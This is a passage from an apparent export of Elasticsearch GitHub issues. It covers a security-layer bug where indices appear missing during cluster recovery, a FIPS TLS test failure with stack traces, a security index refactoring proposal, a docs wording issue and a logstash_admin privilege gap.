
curl: (7) Failed to connect to localhost port 9200 after 3 ms: Connection refused

{}        // <-- One response suggesting .kibana_8.5.0_001 does not exist
{"".kibana_8.5.0_001"":{""aliases"":{"".kibana"":{""is_hidden"":true},"".kibana_8.5.0"":{""is_hidden"":true}},""mappings"":{},""settings"":{}}}
{"".kibana_8.5.0_001"":{""aliases"":{"".kibana"":{""is_hidden"":true},"".kibana_8.5.0"":{""is_hidden"":true}},""mappings"":{},""settings"":{}}}
...
```

When Kibana is started at the same time as Elasticsearch, this behaviour causes Kibana to believe that there isn't any existing indices to migrate from. Kibana therefore attempts to initialize the cluster as a new cluster which can lead to a failed upgrade migration and in some circumstances data loss.","Pinging @elastic/es-security (Team:Security)The get-index action itself checks that the cluster is properly recovered before responding:

https://github.com/elastic/elasticsearch/blob/e15d5221e7634c0d989bf66f23ab6891fce8f15c/server/src/main/java/org/elasticsearch/action/support/master/info/TransportClusterInfoAction.java#L50-L54

However, the security layer uses a different cluster state to resolve the indices, and it does this first so it may observe an unrecovered state here:

https://github.com/elastic/elasticsearch/blob/adf8e01286023407e1023cd6fa26ec0228127d1a/x-pack/plugin/security/src/main/java/org/elasticsearch/xpack/security/authz/AuthorizationService.java#L415I think David's assesment of the core issue causing the bug is correct.

Just to clarify the problem statement, is this correct @rudolf ?
**ES with Security enabled temporarily responds that indices do not exist while the cluster state is being recovered**.

The bug fix probably needs to implement a similar wait-for-state-recovery verification in the Security filter, but I'm not yet sure if the check should run in all cases (ie for all actions on indices).> ES with Security enabled temporarily responds that indices do not exist while the cluster state is being recovered.

Correct.

The first thing Kibana does is use the get indices API, but it also has many other interactions with cluster state like adding write blocks, cloning an index and adding/removing aliases through the aliases API. I don't know enough of the architecture to say what the implications might be, but I suspect e.g. cloning an index might also fail if the cluster state hasn't been recovered and the index is deemed to not exist. And different nodes could be in different phases of recovery.

So broadly speaking, as a consumer of Elasticsearch, I would expect it not to process any requests (including search and/or document API requests) before it's ready to give a ""correct"" answer.I got to spend some more time on this today.

The Security request filter modifies the index name list of requests.
It does so even if the cluster is not recovered yet (or, more generally, if there is a cluster metadata_read block).
The downstream core code will use the modified indices list, wait until the cluster is recovered, and use the modified list. The problem is that the list would be different if Security waited for the cluster to recover in the first place.

Security modifies the indices lists in requests in order to replace wildcards and, pertinent to the case at hand, to remove missing and unauthorized names when the `ignore_unavailable` request option is `true` https://github.com/elastic/elasticsearch/blob/30185053bf2511c5566a73871bf734e984e5dfe8/server/src/main/java/org/elasticsearch/cluster/metadata/IndexAbstractionResolver.java#L138


I think the best fix to implement is to error the REST request, from Security, if the cluster is not recovered yet (more specifically if there is a `metadata_read` type of block).

This sounds like a downgrade from when Security is disabled (because in that case we wait for the cluster to recover), but it's not quite so bad in practice.That's because we already reject requests during authentication and role resolving if the `.security` index is not available (index shards start to be allocated only after the cluster is recovered). So, the cases where requests will start to be rejected are for clients using non-indexed credentials (eg service accounts, file-based and reserved users) AND with built-in or file-based role mapping and role descriptors (all which are not indexed) - one practical setup example that I can think of is LDAP/AD with file-based role-mapping and roles.

Alternatives that I've considered are:
 * wait rather than immediately reject the request; the problem is that I don't know how long to wait for (Core code knows because it has more context, ie the request type)
 * do not remove missing names (only unauthorized) when when ignore_unavailable is `true`; this doesn't solve it for wildcards, ie wildcards will still be expanded to nothing when the cluster is recovering.

Any input will be very appreciated @DaveCTurner @ywangd and @jakelandis .Will the work to move to single strategy for index name resolution (between core / x-pack) to resolve this issue. i.e. after moving there won't be difference since it will always wait to recover ?

I assume that a `metadata_read` block means that we shouldn't read the index meta data when that block is present, so raising an error or waiting makes sense.  I think ideally we would wait instead of error since that is more aligned with other actions. Is core waiting due to the master node time out associated with the master action ? If so, then we could replicate that wait in the security filter. If the current cluster state has the block and is a master action then retry with a new view of cluster state until the master time out expires or the block clears. I am bit outside my comfort zone here, so I don't give my opinion too much merit. > the problem is that I don't know how long to wait for (Core code knows because it has more context, ie the request type)

Could you please give me a few pointers (e.g. link to code) on how core has more context and why request type does not work for the security area of code? I think it might be fine to error, but I'd like to understand better why wait is not an option (or hard). Thanks!> pertinent to the case at hand, to remove missing and unauthorized names when the ignore_unavailable request option is true

So would a workaround for Kibana be to not specify `ignore_unavailable=true`?> Will the work to move to single strategy for index name resolution (between core / x-pack) to resolve this issue. i.e. after moving there won't be difference since it will always wait to recover ?

No, I don't think that's the case.
The problem here is not that the resolution implementatin is different, which will be resolved when there would be a single implementation.
The problem is that the index resolution runs at different times during the request processing lifecycle.
When Security is enabled it runs on the coordinating node before the request is handled on that node.
When Security is disabled it runs on the master node, while the request is being handled (or just before it, technically), see: https://github.com/elastic/elasticsearch/blob/bfccd20155e2244829892c8b309445d83ec27c81/server/src/main/java/org/elasticsearch/action/support/master/info/TransportClusterInfoAction.java#L52
In this context, the master node has logic to defer executing the action until no more cluster/index-level blocks are set: https://github.com/elastic/elasticsearch/blob/30e6fde1be43bd21e8fe300869c3c808afc5fad4/server/src/main/java/org/elasticsearch/action/support/master/TransportMasterNodeAction.java#L200

> we could replicate that wait in the security filter. If the current cluster state has the block and is a master action then retry with a new view of cluster state until the master time out expires or the block clears.

Yes technically we could replicate it but looking at the code in class`TransportMasterNodeAction#AsyncSingleAction` the retry logic looks to me very specific to a master node's internal dwellings and I think it would be clumsy to extract that in the Security request filter. I think it might technically work (maybe @DaveCTurner will contradict me) but I'm having a hard time thinking of the interface for the method that we should factor out and reuse on the Security filter.

> Could you please give me a few pointers (e.g. link to code) on how core has more context and why request type does not work for the security area of code? 

https://github.com/elastic/elasticsearch/blob/30e6fde1be43bd21e8fe300869c3c808afc5fad4/server/src/main/java/org/elasticsearch/action/support/master/TransportMasterNodeAction.java#L175

Is the class that runs on the master node and implements the retry logic for actions executed there. It is my impression that exposing that in the request filter to be run on the coordinating node will be clumsy (we have to check the action/request type, and find a way to factor out the block-retry logic).

> So would a workaround for Kibana be to not specify ignore_unavailable=true?

I think that would be a workaround yes.
It is unfortunate that the Security filter removes authorized but missing names from a request when `ignore_unavailable=true`.  I think we can fix this.

To recap, I think we have a couple of options to consider. I can PoC any/all of them if that would help us to make a decision.
* In the Security filter, reject the request with 500/SERVICE_UNAVAILABLE, when there is the `metadata_read` cluster-level block, like in the case where authn or authz needs something from the `.security` index which is not available yet.
* In the Security filter, retry the request, in the same case of a `metadata_read` cluster-level block, which requires exposing master node's retry logic to be executed on coordinating nodes.
* Make the Security filter NOT remove authorized names for missing indices when `ignore_unavailable=true`; this will fix this bug issue specifically, but if instead the request used wildcards rather than explicit names, it would still be possible to erroneously report that no such indices exist when in fact the cluster state is not yet recovered.
",no,">bug,:Security/Authorization,Team:Security,"
elastic/elasticsearch,1042429765,"[CI] TransformContinuousIT testContinousEvents failing on FIPS JVM","We've been asked to raise FIPS related test failure and this looks like one, a ML test failed due to a dead node  because of:

```
» [2021-11-02T13:43:52,327][WARN ][o.e.t.TcpTransport       ] [javaRestTest-1] exception caught on transport layer [Netty4TcpChannel{localAddress=/127.0.0.1:44922, remoteAddress=/127.0.0.1:55548, profile=default}], closing connection
»  io.netty.handler.codec.DecoderException: javax.net.ssl.SSLException: org.bouncycastle.tls.TlsFatalAlert: bad_record_mac(20)
»  	at io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:477) ~[netty-codec-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.handler.codec.ByteToMessageDecoder.channelRead(ByteToMessageDecoder.java:276) ~[netty-codec-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) [netty-transport-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) [netty-transport-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.channel.AbstractChannelHandlerContext.fireChannelRead(AbstractChannelHandlerContext.java:357) [netty-transport-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.channel.DefaultChannelPipeline$HeadContext.channelRead(DefaultChannelPipeline.java:1410) [netty-transport-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:379) [netty-transport-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.channel.AbstractChannelHandlerContext.invokeChannelRead(AbstractChannelHandlerContext.java:365) [netty-transport-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.channel.DefaultChannelPipeline.fireChannelRead(DefaultChannelPipeline.java:919) [netty-transport-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.channel.nio.AbstractNioByteChannel$NioByteUnsafe.read(AbstractNioByteChannel.java:166) [netty-transport-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.channel.nio.NioEventLoop.processSelectedKey(NioEventLoop.java:719) [netty-transport-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.channel.nio.NioEventLoop.processSelectedKeysPlain(NioEventLoop.java:620) [netty-transport-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.channel.nio.NioEventLoop.processSelectedKeys(NioEventLoop.java:583) [netty-transport-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.channel.nio.NioEventLoop.run(NioEventLoop.java:493) [netty-transport-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.util.concurrent.SingleThreadEventExecutor$4.run(SingleThreadEventExecutor.java:986) [netty-common-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.util.internal.ThreadExecutorMap$2.run(ThreadExecutorMap.java:74) [netty-common-4.1.66.Final.jar:4.1.66.Final]
»  	at java.lang.Thread.run(Thread.java:831) [?:?]
»  Caused by: javax.net.ssl.SSLException: org.bouncycastle.tls.TlsFatalAlert: bad_record_mac(20)
»  	at org.bouncycastle.jsse.provider.ProvSSLEngine.unwrap(ProvSSLEngine.java:489) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at javax.net.ssl.SSLEngine.unwrap(SSLEngine.java:679) ~[?:?]
»  	at io.netty.handler.ssl.SslHandler$SslEngineType$3.unwrap(SslHandler.java:298) ~[netty-handler-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:1344) ~[netty-handler-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.handler.ssl.SslHandler.decodeJdkCompatible(SslHandler.java:1237) ~[netty-handler-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.handler.ssl.SslHandler.decode(SslHandler.java:1286) ~[netty-handler-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReentryProtection(ByteToMessageDecoder.java:507) ~[netty-codec-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:446) ~[netty-codec-4.1.66.Final.jar:4.1.66.Final]
»  	... 16 more
»  Caused by: org.bouncycastle.tls.TlsFatalAlert: bad_record_mac(20)
»  	at org.bouncycastle.tls.crypto.impl.TlsAEADCipher.decodeCiphertext(TlsAEADCipher.java:267) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at org.bouncycastle.tls.RecordStream.decodeAndVerify(RecordStream.java:232) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at org.bouncycastle.tls.RecordStream.readFullRecord(RecordStream.java:183) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at org.bouncycastle.tls.TlsProtocol.safeReadFullRecord(TlsProtocol.java:727) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at org.bouncycastle.tls.TlsProtocol.offerInput(TlsProtocol.java:1059) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at org.bouncycastle.tls.TlsProtocol.offerInput(TlsProtocol.java:1027) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at org.bouncycastle.jsse.provider.ProvSSLEngine.unwrap(ProvSSLEngine.java:445) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at javax.net.ssl.SSLEngine.unwrap(SSLEngine.java:679) ~[?:?]
»  	at io.netty.handler.ssl.SslHandler$SslEngineType$3.unwrap(SslHandler.java:298) ~[netty-handler-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:1344) ~[netty-handler-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.handler.ssl.SslHandler.decodeJdkCompatible(SslHandler.java:1237) ~[netty-handler-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.handler.ssl.SslHandler.decode(SslHandler.java:1286) ~[netty-handler-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReentryProtection(ByteToMessageDecoder.java:507) ~[netty-codec-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:446) ~[netty-codec-4.1.66.Final.jar:4.1.66.Final]
»  	... 16 more
»  Caused by: java.lang.IllegalStateException: 
»  	at org.bouncycastle.tls.crypto.impl.jcajce.Exceptions.illegalStateException(Exceptions.java:10) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at org.bouncycastle.tls.crypto.impl.jcajce.JceAEADCipherImpl.doFinal(JceAEADCipherImpl.java:146) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at org.bouncycastle.tls.crypto.impl.TlsAEADCipher.decodeCiphertext(TlsAEADCipher.java:263) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at org.bouncycastle.tls.RecordStream.decodeAndVerify(RecordStream.java:232) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at org.bouncycastle.tls.RecordStream.readFullRecord(RecordStream.java:183) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at org.bouncycastle.tls.TlsProtocol.safeReadFullRecord(TlsProtocol.java:727) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at org.bouncycastle.tls.TlsProtocol.offerInput(TlsProtocol.java:1059) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at org.bouncycastle.tls.TlsProtocol.offerInput(TlsProtocol.java:1027) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at org.bouncycastle.jsse.provider.ProvSSLEngine.unwrap(ProvSSLEngine.java:445) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at javax.net.ssl.SSLEngine.unwrap(SSLEngine.java:679) ~[?:?]
»  	at io.netty.handler.ssl.SslHandler$SslEngineType$3.unwrap(SslHandler.java:298) ~[netty-handler-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:1344) ~[netty-handler-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.handler.ssl.SslHandler.decodeJdkCompatible(SslHandler.java:1237) ~[netty-handler-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.handler.ssl.SslHandler.decode(SslHandler.java:1286) ~[netty-handler-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReentryProtection(ByteToMessageDecoder.java:507) ~[netty-codec-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:446) ~[netty-codec-4.1.66.Final.jar:4.1.66.Final]
»  	... 16 more
»  Caused by: javax.crypto.AEADBadTagException: Error finalising cipher data: mac check in GCM failed
»  	at jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) ~[?:?]
»  	at jdk.internal.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:78) ~[?:?]
»  	at jdk.internal.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) ~[?:?]
»  	at java.lang.reflect.Constructor.newInstanceWithCaller(Constructor.java:499) ~[?:?]
»  	at java.lang.reflect.Constructor.newInstance(Constructor.java:480) ~[?:?]
»  	at org.bouncycastle.jcajce.provider.ClassUtil.throwBadTagException(Unknown Source) ~[bc-fips-1.0.2.jar:?]
»  	at org.bouncycastle.jcajce.provider.BaseCipher.engineDoFinal(Unknown Source) ~[bc-fips-1.0.2.jar:?]
»  	at org.bouncycastle.jcajce.provider.BaseCipher.engineDoFinal(Unknown Source) ~[bc-fips-1.0.2.jar:?]
»  	at javax.crypto.Cipher.doFinal(Cipher.java:2152) ~[?:?]
»  	at org.bouncycastle.tls.crypto.impl.jcajce.JceAEADCipherImpl.doFinal(JceAEADCipherImpl.java:140) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at org.bouncycastle.tls.crypto.impl.TlsAEADCipher.decodeCiphertext(TlsAEADCipher.java:263) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at org.bouncycastle.tls.RecordStream.decodeAndVerify(RecordStream.java:232) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at org.bouncycastle.tls.RecordStream.readFullRecord(RecordStream.java:183) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at org.bouncycastle.tls.TlsProtocol.safeReadFullRecord(TlsProtocol.java:727) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at org.bouncycastle.tls.TlsProtocol.offerInput(TlsProtocol.java:1059) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at org.bouncycastle.tls.TlsProtocol.offerInput(TlsProtocol.java:1027) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at org.bouncycastle.jsse.provider.ProvSSLEngine.unwrap(ProvSSLEngine.java:445) ~[bctls-fips-1.0.9.jar:1.0.9]
»  	at javax.net.ssl.SSLEngine.unwrap(SSLEngine.java:679) ~[?:?]
»  	at io.netty.handler.ssl.SslHandler$SslEngineType$3.unwrap(SslHandler.java:298) ~[netty-handler-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.handler.ssl.SslHandler.unwrap(SslHandler.java:1344) ~[netty-handler-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.handler.ssl.SslHandler.decodeJdkCompatible(SslHandler.java:1237) ~[netty-handler-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.handler.ssl.SslHandler.decode(SslHandler.java:1286) ~[netty-handler-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.handler.codec.ByteToMessageDecoder.decodeRemovalReentryProtection(ByteToMessageDecoder.java:507) ~[netty-codec-4.1.66.Final.jar:4.1.66.Final]
»  	at io.netty.handler.codec.ByteToMessageDecoder.callDecode(ByteToMessageDecoder.java:446) ~[netty-codec-4.1.66.Final.jar:4.1.66.Final]
»  	... 16 more
```



**Build scan:**
https://gradle-enterprise.elastic.co/s/rzr4h6ecezfke/tests/:x-pack:plugin:transform:qa:multi-node-tests:javaRestTest/org.elasticsearch.xpack.transform.integration.continuous.TransformContinuousIT/testContinousEvents

**Reproduction line:**
`./gradlew ':x-pack:plugin:transform:qa:multi-node-tests:javaRestTest' --tests ""org.elasticsearch.xpack.transform.integration.continuous.TransformContinuousIT.testContinousEvents"" -Dtests.seed=D33C8F79C141C5B8 -Dtests.locale=pl -Dtests.timezone=Etc/GMT+4 -Druntime.java=16 -Dtests.fips.enabled=true`

**Applicable branches:**
7.15

**Reproduces locally?:**
Didn't try

**Failure history:**
https://gradle-enterprise.elastic.co/scans/tests?tests.container=org.elasticsearch.xpack.transform.integration.continuous.TransformContinuousIT&tests.test=testContinousEvents

**Failure excerpt:**
```
org.elasticsearch.ElasticsearchStatusException: Elasticsearch exception [type=node_not_connected_exception, reason=[javaRestTest-1][127.0.0.1:44922] Node not connected]

  at org.elasticsearch.rest.BytesRestResponse.errorFromXContent(BytesRestResponse.java:176)
  at org.elasticsearch.client.RestHighLevelClient.parseEntity(RestHighLevelClient.java:2011)
  at org.elasticsearch.client.RestHighLevelClient.parseResponseException(RestHighLevelClient.java:1988)
  at org.elasticsearch.client.RestHighLevelClient.internalPerformRequest(RestHighLevelClient.java:1745)
  at org.elasticsearch.client.RestHighLevelClient.performRequest(RestHighLevelClient.java:1717)
  at org.elasticsearch.client.RestHighLevelClient.performRequestAndParseEntity(RestHighLevelClient.java:1684)
  at org.elasticsearch.client.TransformClient.getTransformStats(TransformClient.java:141)
  at org.elasticsearch.xpack.transform.integration.continuous.TransformContinuousIT.getTransformStats(TransformContinuousIT.java:489)
  at org.elasticsearch.xpack.transform.integration.continuous.TransformContinuousIT.lambda$waitUntilTransformsProcessedNewData$3(TransformContinuousIT.java:503)
  at org.elasticsearch.test.ESTestCase.assertBusy(ESTestCase.java:1027)
  at org.elasticsearch.xpack.transform.integration.continuous.TransformContinuousIT.waitUntilTransformsProcessedNewData(TransformContinuousIT.java:502)
  at org.elasticsearch.xpack.transform.integration.continuous.TransformContinuousIT.testContinousEvents(TransformContinuousIT.java:274)
  at jdk.internal.reflect.NativeMethodAccessorImpl.invoke0(NativeMethodAccessorImpl.java:-2)
  at jdk.internal.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:78)
  at jdk.internal.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
  at java.lang.reflect.Method.invoke(Method.java:567)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.invoke(RandomizedRunner.java:1750)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$8.evaluate(RandomizedRunner.java:938)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$9.evaluate(RandomizedRunner.java:974)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$10.evaluate(RandomizedRunner.java:988)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleSetupTeardownChained$1.evaluate(TestRuleSetupTeardownChained.java:49)
  at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
  at org.apache.lucene.util.TestRuleThreadAndTestName$1.evaluate(TestRuleThreadAndTestName.java:48)
  at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
  at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl.forkTimeoutingTask(ThreadLeakControl.java:817)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$3.evaluate(ThreadLeakControl.java:468)
  at com.carrotsearch.randomizedtesting.RandomizedRunner.runSingleTest(RandomizedRunner.java:947)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$5.evaluate(RandomizedRunner.java:832)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$6.evaluate(RandomizedRunner.java:883)
  at com.carrotsearch.randomizedtesting.RandomizedRunner$7.evaluate(RandomizedRunner.java:894)
  at org.apache.lucene.util.AbstractBeforeAfterRule$1.evaluate(AbstractBeforeAfterRule.java:45)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleStoreClassName$1.evaluate(TestRuleStoreClassName.java:41)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.NoShadowingOrOverridesOnMethodsRule$1.evaluate(NoShadowingOrOverridesOnMethodsRule.java:40)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at org.apache.lucene.util.TestRuleAssertionsRequired$1.evaluate(TestRuleAssertionsRequired.java:53)
  at org.apache.lucene.util.TestRuleMarkFailure$1.evaluate(TestRuleMarkFailure.java:47)
  at org.apache.lucene.util.TestRuleIgnoreAfterMaxFailures$1.evaluate(TestRuleIgnoreAfterMaxFailures.java:64)
  at org.apache.lucene.util.TestRuleIgnoreTestSuites$1.evaluate(TestRuleIgnoreTestSuites.java:54)
  at com.carrotsearch.randomizedtesting.rules.StatementAdapter.evaluate(StatementAdapter.java:36)
  at com.carrotsearch.randomizedtesting.ThreadLeakControl$StatementRunner.run(ThreadLeakControl.java:368)
  at java.lang.Thread.run(Thread.java:831)

```","Pinging @elastic/es-security (Team:Security)I don't think this is really FIPS related - it just happened on a FIPS enabled JVM.

This
```
»  Caused by: javax.crypto.AEADBadTagException: Error finalising cipher data: mac check in GCM failed
```

can occur when the read side of the socket receives a partial block of encrypted data. GCM uses something like a checksum, and if the block is only partially received, the checksum will be wrong.

That fits with this:
```
org.elasticsearch.ElasticsearchStatusException: Elasticsearch exception [type=node_not_connected_exception, reason=[javaRestTest-1][127.0.0.1:44922] Node not connected]
```

If a node disconnected suddenly without closing the socket cleanly, you could get a TLS GCM error.

However, that's not the end of the story.
If we look at the logs for `javaRestTest-1` to find out why it's not connected we see:

```
[2021-11-02T13:43:52,327][WARN ][o.e.t.TcpTransport       ] [javaRestTest-1] exception caught on transport layer [Netty4TcpChannel{localAddress=/127.0.0.1:44922, remoteAddress=/127.0.0.1:55548, profile=default}], closing connection
io.netty.handler.codec.DecoderException: javax.net.ssl.SSLException: org.bouncycastle.tls.TlsFatalAlert: bad_record_mac(20)
```

It looks like some sort of network issue. Possibly a bug in BC-FIPS, but there's not real reason to thing that's more likely than any other cause.

I think we're can put this one down to noise for now, but if we see it again (which might be in another test cluster suite), we might need to investigate further.One more in my PR CI: https://gradle-enterprise.elastic.co/s/3f3dhjt7bz5hy

It's also a FIPS one ... ",no,">test-failure,:Security/Security,Team:Security,v7.15.3,"
elastic/elasticsearch,385885134,"Replace SecurityIndexManager with special client","Currently, we use the `SecurityIndexManager` throughout our code to be ""smart"" and preempt certain conditions based on the last observed cluster state when interacting with the security index. However these conditions that we try to preempt can still occur so we still need to handle them within each individual response listener. The `SecurityIndexManager` is also responsible for ensuring that the index has the correct mappings and has been upgraded to the latest version. 

In order to simplify our code, it has been suggested that we replace this with a specialized client that knows how to handle the error conditions and that we do not preempt failures. One item that would be a prerequisite would be to disallow the auto creation of the security index by a index request, see #34737.","Pinging @elastic/es-securityWe've uncovered another problem of this. The callers that race to create the index (`prepareIndexIfNeededThenExecute`) and fail with `ResourceAlreadyExistsException` don't wait for shards to become available, and will error out with a missing shard exception.I think this one relates as well: https://github.com/elastic/elasticsearch/issues/45250

We see this error fairly often in the .NET client CI:https://github.com/elastic/elasticsearch-net/issues/4280I think the above two comments specifically refer to https://github.com/elastic/elasticsearch/issues/46214",no,">refactoring,:Security/Security,Team:Security,"
elastic/elasticsearch,353238735,"[DOCS] Roles API docs refer to ""native"" realm, which is misleading","Our docs for the roles API refer to roles in the native realm.
This is confusing for 2 reasons:

1. Realms are for users, not roles. Technically roles don't live in realms and the 2 are quite separate. It sometimes leads people to think that
   (a) native users can only have ""native"" roles, and file users can only have file roles. 
   (b) you have to have the native realm enabled in order to use ""native"" roles.
2. Because it's inaccurate, it's also not very clear. _Native_ doesn't mean a lot in that context, so it's not always obvious to the reader that `GET /_xpack/security/role` will only return API-based roles, and will not return file based roles (or custom/extension roles).

I would just raise a PR to fix this, but I'm not sure what the most helpful terminology is going to be, so I will probably need to think about (and take suggestions) before we make a change.
","Pinging @elastic/es-security[docs issue triage]

Leaving open. This is still relevant.",no,">docs,:Security/Authorization,Team:Security,"
elastic/elasticsearch,405773024,"logstash_admin builtin role permissions not enough for central pipeline management","**Elasticsearch version** (`bin/elasticsearch --version`): 6.5.4

**Plugins installed**: [N/A]

**JVM version** (`java -version`): N/A

**OS version** (`uname -a` if on a Unix-like system): N/A

**Description of the problem including expected versus actual behavior**:
When following the [instructions](https://www.elastic.co/guide/en/logstash/current/configuring-centralized-pipelines.html) to get centralized pipeline management to work with logstash the following is mentioned:

> If your Elasticsearch cluster is protected with basic authentication, assign the logstash_admin role to any users who will use centralized pipeline management

With that role only logstash doesn't start and returns a 403 error coming from Elasticsearch:
```
[2019-01-16T18:52:58,866][WARN ][logstash.licensechecker.licensereader] Attempted to resurrect connection to dead ES instance, but got an error. {:url=>""https://logstash_admin_user:xxxxxx@my_es_url:9243/"", :error_type=>LogStash::Outputs::ElasticSearch::HttpClient::Pool::BadResponseCodeError, :error=>""Got response code '403' contacting Elasticsearch at URL 'https://my_es_url:9243/'""}
```

Just adding to the user the ""cluster:monitor"" privilege (monitor privilege at cluster level) it works, so I believe the permission might be missing in logstash_admin role.

**Steps to reproduce**:
Based on this [document](https://www.elastic.co/guide/en/logstash/current/configuring-centralized-pipelines.html#configuration-management-settings)

 1. Create a user for centralized pipeline management and add the builtin role `logstash_admin` to the user.
 2. Enable and configure centralized pipeline management in logstash, with the user created in the previous step in `xpack.management.elasticsearch.username` setting. Add also the password, the url and set enabled to true.
 3. Start logstash, it will fail with a 403 error

Workaround:
1. Stop logstash
2. Create a role in Elasticsearch with privilege ""cluster:monitor"".
3. Assign that new role to the previously created user.
4. Start logsatsh, it will start properly.

Notes:
There's one other [document](https://www.elastic.co/guide/en/logstash/6.6/ls-security.html#ls-pipeline-management-user) (not aligned with the previously shared one) that includes a different message, mentioning that for central management to work, the roles `logstash_admin` and the custom role `logstash_writer` should be added to the user.

My view is that this document is probably not the right solution, because:
- logstash_writer is a custom role, created for a different purpose.
- The permissions in logstash_writer role are more than the minimum permissions needed for the central pipeline management to work.

